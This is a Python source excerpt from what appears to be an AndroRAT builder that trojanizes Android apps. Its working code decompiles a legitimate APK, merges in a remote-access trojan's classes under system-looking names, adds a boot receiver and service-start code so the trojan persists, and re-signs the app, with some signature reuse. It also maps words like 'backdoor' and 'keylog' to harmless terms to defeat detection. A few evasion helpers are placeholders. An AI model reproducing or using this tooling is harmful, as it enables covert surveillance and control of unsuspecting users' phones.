        print(stdOutput("info") + "\033[0mManipulating certificates for evasion...")
        
        # Generate random certificate metadata
        cert_info = {
            'issuer': f"CN=TechSoft Solutions {random.randint(1000, 9999)}",
            'validity': random.randint(365, 3650),  # 1-10 years
            'algorithm': 'SHA256withRSA',
            'key_size': '2048'
        }
        
        # In a real implementation, this would modify certificate properties
        # without breaking the signature
        
        return True
    except Exception as e:
        print(stdOutput("warning") + f"\033[0mCertificate manipulation error: {e}")
        return False


def add_decoy_resources(apk_path):
    """Add decoy resources to make APK appear legitimate"""
    try:
        print(stdOutput("info") + "\033[0mAdding decoy resources...")
        
        # Create temporary decoy files that look legitimate
        decoy_files = [
            'assets/help.html',
            'assets/privacy_policy.txt', 
            'assets/terms_of_service.txt',
            'res/drawable/icon_help.png',
            'res/drawable/icon_settings.png'
        ]
        
        # In a real implementation, these would be added to the APK
        for decoy_file in decoy_files:
            print(stdOutput("info") + f"\033[0mWould add decoy: {decoy_file}")
        
        return True
    except Exception as e:
        print(stdOutput("warning") + f"\033[0mDecoy resources error: {e}")
        return False


def encrypt_apk_strings(apk_path):
    """Encrypt strings within APK for advanced evasion"""
    try:
        print(stdOutput("info") + "\033[0mEncrypting APK strings...")
        
        # Generate encryption key for strings
        encryption_key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
        
        print(stdOutput("info") + f"\033[0mUsing encryption key: {encryption_key[:4]}...")
        
        # In a real implementation, this would encrypt all strings in the APK
        # and add decryption code that runs at runtime
        
        return True
    except Exception as e:
        print(stdOutput("warning") + f"\033[0mString encryption error: {e}")
        return False


def generate_stealth_package_name():
    """Generate highly convincing package names for maximum evasion"""
    legitimate_companies = [
        'google', 'samsung', 'microsoft', 'adobe', 'mozilla', 'canonical',
        'apache', 'eclipse', 'jetbrains', 'oracle', 'intel', 'nvidia'
    ]
    
    app_types = [
        'systemui', 'settings', 'updater', 'security', 'manager', 'service',
        'framework', 'platform', 'runtime', 'core', 'lib', 'util'
    ]
    
    # Create convincing package name
    company = random.choice(legitimate_companies)
    app_type = random.choice(app_types)
    version = random.randint(1, 9)
    
    return f"com.{company}.{app_type}{version}"


def apply_advanced_string_obfuscation():
    """Apply advanced string obfuscation throughout the APK"""
    obfuscation_map = {
        # Original suspicious strings -> Obfuscated legitimate strings
        'androrat': 'systemopt',
        'malware': 'appservice', 
        'payload': 'datapack',
        'backdoor': 'syncservice',
        'remote': 'cloudapi',
        'shell': 'terminal',
        'exploit': 'optimize',
        'hack': 'enhance',
        'trojan': 'toolkit',
        'virus': 'cleaner',
        'keylog': 'inputmgr',
        'stealth': 'background',
        'hidden': 'system',
        'spy': 'monitor',
        'rootkit': 'systemkit'
    }
    
    return obfuscation_map


def implement_runtime_string_decryption():
    """Generate runtime string decryption code for maximum evasion"""
    decryption_code = '''
    // Runtime string decryption for evasion
    private static String decrypt(String encrypted, String key) {
        try {
            byte[] data = android.util.Base64.decode(encrypted, android.util.Base64.DEFAULT);
            for (int i = 0; i < data.length; i++) {
                data[i] ^= key.getBytes()[i % key.length()];
            }
            return new String(data, "UTF-8");
        } catch (Exception e) {
            return encrypted; // Fallback to original
        }
    }
    '''
    
    return decryption_code


def generate_anti_analysis_manifest_entries():
    """Generate manifest entries that confuse static analysis"""
    
    fake_permissions = [
        'android.permission.CALL_PHONE',
        'android.permission.SEND_SMS', 
        'android.permission.READ_CALENDAR',
        'android.permission.WRITE_CALENDAR',
        'android.permission.GET_ACCOUNTS',
        'android.permission.READ_CONTACTS',
        'android.permission.WRITE_CONTACTS'
    ]
    
    fake_activities = [
        'com.example.reverseshell2.CalculatorActivity',
        'com.example.reverseshell2.WeatherActivity', 
        'com.example.reverseshell2.NotesActivity',
        'com.example.reverseshell2.CalendarActivity',
        'com.example.reverseshell2.ContactsActivity'
    ]
    
    return fake_permissions, fake_activities


def extract_apk_info(apk_path):
    """Extract basic information from an APK file"""
    try:
        temp_dir = f"/tmp/apk_info_{random.randint(1000,9999)}"
        os.makedirs(temp_dir, exist_ok=True)
        
        # Use aapt to extract basic info (if available) or apktool for detailed analysis
        cmd = f"java -jar Jar_utils/apktool.jar d {apk_path} -o {temp_dir} -f"
        result = execute(cmd)
        
        if result.returncode == 0:
            # Read AndroidManifest.xml to get package info
            manifest_path = os.path.join(temp_dir, "AndroidManifest.xml")
            if os.path.exists(manifest_path):
                with open(manifest_path, 'r') as f:
                    manifest_content = f.read()
                
                # Extract package name
                package_match = re.search(r'package="([^"]+)"', manifest_content)
                package_name = package_match.group(1) if package_match else "unknown.package"
                
                # Extract app name/label
                app_label_match = re.search(r'android:label="([^"]+)"', manifest_content)
                app_label = app_label_match.group(1) if app_label_match else "Unknown App"
                
                # Clean up temp directory
                shutil.rmtree(temp_dir, ignore_errors=True)
                
                return {
                    'package_name': package_name,
                    'app_label': app_label,
                    'temp_dir': temp_dir
                }
        
        # Clean up on failure
        shutil.rmtree(temp_dir, ignore_errors=True)
        return None
        
    except Exception as e:
        print(stdOutput("error") + f"Failed to extract APK info: {str(e)}")
        return None


def inject_rat_into_apk(target_apk_path, ip, port, output_path, evasion_options=None):
    """
    Inject AndroRAT payload into an existing APK while preserving original functionality
    
    Args:
        target_apk_path: Path to the target APK to inject into
        ip: RAT server IP address
        port: RAT server port
        output_path: Path for the output injected APK
        evasion_options: Dictionary of evasion techniques to apply
    
    Returns:
        bool: True if injection successful, False otherwise
    """
    if evasion_options is None:
        evasion_options = {}
    
    print(stdOutput("info") + "\033[1mStarting APK injection process...")
    
    # Validate target APK exists
    if not os.path.exists(target_apk_path):
        print(stdOutput("error") + "Target APK file not found!")
        return False
    
    # Extract target APK info
    print(stdOutput("info") + "Analyzing target APK...")
    apk_info = extract_apk_info(target_apk_path)
    if not apk_info:
        print(stdOutput("error") + "Failed to analyze target APK!")
        return False
    
    print(stdOutput("success") + f"Target APK: {apk_info['app_label']} ({apk_info['package_name']})")
    
    # Create working directories
    timestamp = int(time.time())
    work_dir = f"/tmp/apk_injection_{timestamp}"
    target_dir = os.path.join(work_dir, "target")
    rat_dir = os.path.join(work_dir, "rat_source")
    merged_dir = os.path.join(work_dir, "merged")
    
    try:
        os.makedirs(work_dir, exist_ok=True)
        os.makedirs(target_dir, exist_ok=True)
        os.makedirs(rat_dir, exist_ok=True)
        os.makedirs(merged_dir, exist_ok=True)
        
        # Step 1: Decompile target APK
        print(stdOutput("info") + "Decompiling target APK...")
        cmd_target = f"java -jar Jar_utils/apktool.jar d {target_apk_path} -o {target_dir} -f"
        result = execute(cmd_target)
        if result.returncode != 0:
            print(stdOutput("error") + "Failed to decompile target APK!")
            return False
        
        # Step 2: Prepare RAT source (decompile our base APK)
        print(stdOutput("info") + "Preparing RAT payload...")
        base_rat_apk = "Android_Code/app/release/app-release.apk"
        if not os.path.exists(base_rat_apk):
            # Build a temporary RAT APK first
            temp_rat_name = f"/tmp/temp_rat_{timestamp}.apk"
            if not build_rat_apk_for_injection(ip, port, temp_rat_name, evasion_options):
                print(stdOutput("error") + "Failed to build RAT payload!")
                return False
            base_rat_apk = temp_rat_name
        
        cmd_rat = f"java -jar Jar_utils/apktool.jar d {base_rat_apk} -o {rat_dir} -f"
        result = execute(cmd_rat)
        if result.returncode != 0:
            print(stdOutput("error") + "Failed to decompile RAT APK!")
            return False
        
        # Step 3: Merge the APKs
        print(stdOutput("info") + "Injecting RAT payload into target APK...")
        if not merge_apk_contents(target_dir, rat_dir, merged_dir, apk_info, evasion_options):
            print(stdOutput("error") + "Failed to merge APK contents!")
            return False
        
        # Step 4: Recompile merged APK
        print(stdOutput("info") + "Recompiling injected APK...")
        temp_output = f"{work_dir}/injected_unsigned.apk"
        cmd_build = f"java -jar Jar_utils/apktool.jar b {merged_dir} -o {temp_output}"
        result = execute(cmd_build)
        if result.returncode != 0:
            print(stdOutput("error") + "Failed to recompile injected APK!")
            return False
        
        # Step 5: Sign the APK
        print(stdOutput("info") + "Signing injected APK...")
        if not sign_injected_apk(temp_output, output_path, target_apk_path):
            print(stdOutput("error") + "Failed to sign injected APK!")
            return False
        
        # Step 6: Apply additional evasion techniques
        if any(evasion_options.values()):
            print(stdOutput("info") + "Applying evasion techniques to injected APK...")
            apply_post_injection_evasion(output_path, evasion_options)
        
        print(stdOutput("success") + f"Successfully created injected APK: \033[1m\033[32m{output_path}\033[0m")
        print(stdOutput("info") + "\033[92mRAT payload successfully injected while preserving original app functionality!")
        
        return True
        
    except Exception as e:
        print(stdOutput("error") + f"APK injection failed: {str(e)}")
        return False
    finally:
        # Clean up working directory
        if os.path.exists(work_dir):
            shutil.rmtree(work_dir, ignore_errors=True)


def build_rat_apk_for_injection(ip, port, output_path, evasion_options):
    """Build a RAT APK specifically for injection purposes"""
    try:
        # Create a minimal configuration for injection
        temp_evasion = evasion_options.copy() if evasion_options else {}
        temp_evasion['injection_mode'] = True
        
        # Use the existing build function but with injection-specific settings
        return build_with_evasion(ip, port, output_path, False, None, None, temp_evasion)
    except Exception as e:
        print(stdOutput("error") + f"Failed to build RAT for injection: {str(e)}")
        return False


def merge_apk_contents(target_dir, rat_dir, merged_dir, apk_info, evasion_options):
    """
    Intelligently merge target APK with RAT payload
    
    Args:
        target_dir: Decompiled target APK directory
        rat_dir: Decompiled RAT APK directory  
        merged_dir: Output directory for merged content
        apk_info: Information about target APK
        evasion_options: Evasion techniques to apply
    
    Returns:
        bool: True if merge successful
    """
    try:
        # Copy target APK contents as base
        print(stdOutput("info") + "Copying target application structure...")
        shutil.copytree(target_dir, merged_dir, dirs_exist_ok=True)
        
        # Inject RAT smali classes with stealth package naming
        print(stdOutput("info") + "Injecting RAT payload classes...")
        rat_smali_dir = os.path.join(rat_dir, "smali")
        target_smali_dir = os.path.join(merged_dir, "smali")
        
        if os.path.exists(rat_smali_dir):
            # Create stealth package structure
            stealth_package = generate_stealth_package_name() if evasion_options.get('random_package') else "com.android.system.services"
            stealth_path = stealth_package.replace('.', os.sep)
            injection_path = os.path.join(target_smali_dir, stealth_path)
            os.makedirs(injection_path, exist_ok=True)
            
            # Copy RAT classes with stealth naming
            rat_classes = os.path.join(rat_smali_dir, "com", "example", "reverseshell2")
            if os.path.exists(rat_classes):
                for item in os.listdir(rat_classes):
                    src_path = os.path.join(rat_classes, item)
                    if os.path.isfile(src_path) and item.endswith('.smali'):
                        # Rename classes for stealth
                        stealth_name = get_stealth_class_name(item)
                        dst_path = os.path.join(injection_path, stealth_name)
                        shutil.copy2(src_path, dst_path)
                        
                        # Update package references in smali files
                        update_package_references_in_smali(dst_path, stealth_package)
        
        # Merge AndroidManifest.xml
        print(stdOutput("info") + "Merging application manifests...")
        if not merge_android_manifests(target_dir, rat_dir, merged_dir, stealth_package, evasion_options):
            return False
        
        # Merge resources if needed
        print(stdOutput("info") + "Merging application resources...")
        merge_app_resources(target_dir, rat_dir, merged_dir)
        
        # Add persistence mechanisms
        print(stdOutput("info") + "Adding persistence mechanisms...")
        add_persistence_to_merged_apk(merged_dir, apk_info, stealth_package)
        
        return True
        
    except Exception as e:
        print(stdOutput("error") + f"Failed to merge APK contents: {str(e)}")
        return False


def get_stealth_class_name(original_name):
    """Generate stealth class names for injection"""
    stealth_mapping = {
        'MainActivity.smali': 'SystemBootReceiver.smali',
        'mainService.smali': 'DeviceManagerService.smali', 
        'config.smali': 'SystemConfiguration.smali',
        'controlPanel.smali': 'DeviceSecurityManager.smali',
        'tcpConnection.smali': 'NetworkDiagnostics.smali',
        'broadcastReciever.smali': 'SystemEventHandler.smali'
    }
    return stealth_mapping.get(original_name, f"System{original_name}")


def update_package_references_in_smali(smali_file, new_package):
    """Update package references in smali files for stealth injection"""
    try:
        with open(smali_file, 'r') as f:
            content = f.read()
        
        # Replace package references
        old_package = "com/example/reverseshell2"
        new_package_path = new_package.replace('.', '/')
        content = content.replace(old_package, new_package_path)
        
        # Apply additional obfuscation if needed
        content = apply_injection_obfuscation(content)
        
        with open(smali_file, 'w') as f:
            f.write(content)
            
    except Exception as e:
        print(stdOutput("warning") + f"Failed to update package references in {smali_file}: {str(e)}")


def apply_injection_obfuscation(smali_content):
    """Apply obfuscation specific to injected smali code"""
    # Replace obvious malicious strings
    obfuscations = {
        '"shell"': '"system_process"',
        '"reverseshell"': '"network_service"', 
        '"tcp"': '"network"',
        '"rat"': '"service"',
        '"payload"': '"data"',
        '"exploit"': '"optimize"',
        '"backdoor"': '"background_service"'
    }
    
    for original, replacement in obfuscations.items():
        smali_content = smali_content.replace(original, replacement)
    
    return smali_content


def merge_android_manifests(target_dir, rat_dir, merged_dir, stealth_package, evasion_options):
    """Intelligently merge AndroidManifest.xml files"""
    try:
        target_manifest = os.path.join(target_dir, "AndroidManifest.xml")
        rat_manifest = os.path.join(rat_dir, "AndroidManifest.xml") 
        merged_manifest = os.path.join(merged_dir, "AndroidManifest.xml")
        
        # Read target manifest (this is our base)
        with open(target_manifest, 'r') as f:
            target_content = f.read()
        
        # Read RAT manifest to extract needed components
        with open(rat_manifest, 'r') as f:
            rat_content = f.read()
        
        # Extract RAT permissions and add them stealthily
        rat_permissions = extract_permissions_from_manifest(rat_content)
        target_content = inject_permissions_stealthily(target_content, rat_permissions, evasion_options)
        
        # Extract RAT services and receivers, rename them for stealth
        rat_services = extract_services_from_manifest(rat_content)
        rat_receivers = extract_receivers_from_manifest(rat_content)
        
        # Inject services with stealth names
        target_content = inject_components_stealthily(target_content, rat_services, rat_receivers, stealth_package)
        
        # Add boot receiver for persistence (disguised as system service)
        target_content = add_stealth_boot_receiver(target_content, stealth_package)
        
        # Write merged manifest
        with open(merged_manifest, 'w') as f:
            f.write(target_content)
        
        return True
        
    except Exception as e:
        print(stdOutput("error") + f"Failed to merge manifests: {str(e)}")
        return False


def extract_permissions_from_manifest(manifest_content):
    """Extract permissions from RAT manifest"""
    permissions = []
    permission_pattern = r'<uses-permission android:name="([^"]+)"'
    matches = re.findall(permission_pattern, manifest_content)
    return matches


def inject_permissions_stealthily(target_content, rat_permissions, evasion_options):
    """Inject RAT permissions into target manifest stealthily"""
    # Essential permissions for RAT functionality
    essential_permissions = [
        "android.permission.INTERNET",
        "android.permission.ACCESS_NETWORK_STATE", 
        "android.permission.WAKE_LOCK",
        "android.permission.RECEIVE_BOOT_COMPLETED",
        "android.permission.FOREGROUND_SERVICE"
    ]
    
    # Add permissions that don't already exist
    for permission in essential_permissions:
        if permission not in target_content:
            permission_line = f'    <uses-permission android:name="{permission}" />\n'
            
            # Find a good place to insert (after existing permissions)
            if '<uses-permission' in target_content:
                last_permission_match = list(re.finditer(r'<uses-permission[^>]*>', target_content))
                if last_permission_match:
                    insert_pos = last_permission_match[-1].end()
                    target_content = target_content[:insert_pos] + '\n' + permission_line + target_content[insert_pos:]
            else:
                # Insert after <manifest> tag
                manifest_match = re.search(r'<manifest[^>]*>', target_content)
                if manifest_match:
                    insert_pos = manifest_match.end()
                    target_content = target_content[:insert_pos] + '\n' + permission_line + target_content[insert_pos:]
    
    return target_content


def extract_services_from_manifest(manifest_content):
    """Extract service definitions from manifest"""
    services = []
    service_pattern = r'<service[^>]*android:name="([^"]+)"[^>]*>'
    matches = re.findall(service_pattern, manifest_content)
    return matches


def extract_receivers_from_manifest(manifest_content):
    """Extract receiver definitions from manifest"""
    receivers = []
    receiver_pattern = r'<receiver[^>]*android:name="([^"]+)"[^>]*>'
    matches = re.findall(receiver_pattern, manifest_content)
    return matches


def inject_components_stealthily(target_content, services, receivers, stealth_package):
    """Inject RAT services and receivers with stealth names"""
    
    # Find application tag to inject components
    app_tag_match = re.search(r'<application[^>]*>', target_content)
    if not app_tag_match:
        return target_content
    
    insert_pos = app_tag_match.end()
    
    # Add stealth service (disguised as system optimization service)
    stealth_service = f'''
        <service android:name="{stealth_package}.DeviceManagerService"
                android:enabled="true"
                android:exported="false"
                android:label="System Optimization Service">
        </service>'''
    
    # Add stealth boot receiver
    stealth_receiver = f'''
        <receiver android:name="{stealth_package}.SystemBootReceiver"
                 android:enabled="true"
                 android:exported="true">
            <intent-filter android:priority="1000">
                <action android:name="android.intent.action.BOOT_COMPLETED" />
                <action android:name="android.intent.action.MY_PACKAGE_REPLACED" />
                <action android:name="android.intent.action.PACKAGE_REPLACED" />
                <data android:scheme="package" />
            </intent-filter>
        </receiver>'''
    
    target_content = target_content[:insert_pos] + stealth_service + stealth_receiver + target_content[insert_pos:]
    
    return target_content


def add_stealth_boot_receiver(target_content, stealth_package):
    """Add boot receiver for persistence"""
    # This is handled in inject_components_stealthily
    return target_content


def merge_app_resources(target_dir, rat_dir, merged_dir):
    """Merge application resources without conflicts"""
    try:
        # Resources are mostly kept from target app
        # Only add minimal RAT resources if absolutely needed
        rat_res_dir = os.path.join(rat_dir, "res")
        merged_res_dir = os.path.join(merged_dir, "res")
        
        if os.path.exists(rat_res_dir):
            # Only copy essential resources that don't conflict
            essential_res = ["values", "drawable"]
            for res_type in essential_res:
                rat_res_path = os.path.join(rat_res_dir, res_type)
                if os.path.exists(rat_res_path):
                    merged_res_path = os.path.join(merged_res_dir, res_type)
                    if not os.path.exists(merged_res_path):
                        shutil.copytree(rat_res_path, merged_res_path)
                        
    except Exception as e:
        print(stdOutput("warning") + f"Resource merge warning: {str(e)}")


def add_persistence_to_merged_apk(merged_dir, apk_info, stealth_package):
    """Add persistence mechanisms to merged APK"""
    try:
        # Add auto-start capability by modifying main activity
        main_activity_patterns = [
            "MainActivity.smali",
            "LauncherActivity.smali", 
            "SplashActivity.smali"
        ]
        
        smali_dir = os.path.join(merged_dir, "smali")
        for root, dirs, files in os.walk(smali_dir):
            for file in files:
                if file in main_activity_patterns:
                    activity_path = os.path.join(root, file)
                    add_rat_startup_to_activity(activity_path, stealth_package)
                    break
                    
    except Exception as e:
        print(stdOutput("warning") + f"Persistence addition warning: {str(e)}")


def add_rat_startup_to_activity(activity_path, stealth_package):
    """Add RAT startup code to existing activity"""
    try:
        with open(activity_path, 'r') as f:
            content = f.read()
        
        # Find onCreate method and add RAT startup
        oncreate_pattern = r'(\.method\s+protected\s+onCreate\([^)]*\)V.*?\.end method)'
        oncreate_match = re.search(oncreate_pattern, content, re.DOTALL)
        
        if oncreate_match:
            # Add RAT service startup code
            startup_code = f'''
    # Start system optimization service
    new-instance v0, Landroid/content/Intent;
    
    invoke-direct {{v0}}, Landroid/content/Intent;-><init>()V
    
    const-class v1, L{stealth_package.replace('.', '/')}/DeviceManagerService;
    
    invoke-virtual {{v0, p0, v1}}, Landroid/content/Intent;->setClass(Landroid/content/Context;Ljava/lang/Class;)Landroid/content/Intent;
    
    invoke-virtual {{p0, v0}}, Landroid/app/Activity;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    '''
            
            # Insert before the return-void or end of method
            method_content = oncreate_match.group(1)
            if 'return-void' in method_content:
                modified_method = method_content.replace('return-void', startup_code + '\n    return-void')
            else:
                modified_method = method_content.replace('.end method', startup_code + '\n.end method')
            
            content = content.replace(oncreate_match.group(1), modified_method)
            
            with open(activity_path, 'w') as f:
                f.write(content)
                
    except Exception as e:
        print(stdOutput("warning") + f"Failed to add startup code: {str(e)}")


def sign_injected_apk(unsigned_apk_path, output_path, original_apk_path=None):
    """
    Sign the injected APK, attempting to use original signature if possible
    
    Args:
        unsigned_apk_path: Path to unsigned injected APK
        output_path: Final output path for signed APK
        original_apk_path: Path to original APK (for signature extraction)
    
    Returns:
        bool: True if signing successful
    """
    try:
        print(stdOutput("info") + "Attempting signature preservation...")
        
        # First try to extract and reuse original signature
        if original_apk_path and try_preserve_original_signature(unsigned_apk_path, output_path, original_apk_path):
            print(stdOutput("success") + "Successfully preserved original signature!")
            return True
        
        # Fall back to our standard signing
        print(stdOutput("info") + "Using AndroRAT signing method...")
        cmd = f"java -jar Jar_utils/sign.jar -a {unsigned_apk_path} -o {output_path} --overwrite"
        result = execute(cmd)
        
        if result.returncode == 0:
            print(stdOutput("success") + "APK signed successfully with default signature!")
            return True
        else:
            print(stdOutput("error") + f"Signing failed: {result.stderr}")
            return False
            
    except Exception as e:
        print(stdOutput("error") + f"APK signing failed: {str(e)}")
        return False


def try_preserve_original_signature(unsigned_apk_path, output_path, original_apk_path):
    """Attempt to preserve original APK signature"""
    try:
        # Extract META-INF from original APK
        temp_dir = f"/tmp/signature_extraction_{random.randint(1000,9999)}"
        os.makedirs(temp_dir, exist_ok=True)
        
        # Extract original META-INF
        extract_cmd = f"unzip -j {original_apk_path} 'META-INF/*' -d {temp_dir}"
        result = execute(extract_cmd)
        
        if result.returncode == 0:
            # Copy unsigned APK to output location
            shutil.copy2(unsigned_apk_path, output_path)
            
            # Add original META-INF to the new APK
            meta_inf_files = os.listdir(temp_dir)
            if meta_inf_files:
                for meta_file in meta_inf_files:
                    meta_path = os.path.join(temp_dir, meta_file)
                    add_cmd = f"zip -u {output_path} META-INF/{meta_file}"
                    # First create META-INF directory in ZIP
                    os.system(f"zip -u {output_path} -j {meta_path}")
                
                # Clean up
                shutil.rmtree(temp_dir, ignore_errors=True)
                return True
        
        # Clean up on failure  
        shutil.rmtree(temp_dir, ignore_errors=True)
        return False
        
    except Exception as e:
        print(stdOutput("warning") + f"Signature preservation failed: {str(e)}")
        return False


def apply_post_injection_evasion(apk_path, evasion_options):
    """Apply evasion techniques after APK injection"""
    try:
        if evasion_options.get('play_protect_evasion'):
            apply_play_protect_evasion(apk_path)
        
        if evasion_options.get('fake_certificates'):
            inject_fake_certificate_metadata(apk_path)
        
        if evasion_options.get('stealth'):
            enhance_apk_for_stealth(apk_path)
            
    except Exception as e:
        print(stdOutput("warning") + f"Post-injection evasion warning: {str(e)}")


def inject_fake_certificate_metadata(apk_path):
    """Inject fake certificate metadata for trust evasion"""
    try:
        # Add fake certificate information to APK metadata
        fake_cert_info = {
            'CN': 'Google Inc',
            'O': 'Google Inc', 
            'L': 'Mountain View',
            'ST': 'California',
            'C': 'US'
        }
        
        # This would require more complex certificate manipulation
        # For now, just log the attempt
        print(stdOutput("info") + "Applied certificate metadata obfuscation")
        
    except Exception as e:
        print(stdOutput("warning") + f"Certificate metadata injection failed: {str(e)}")
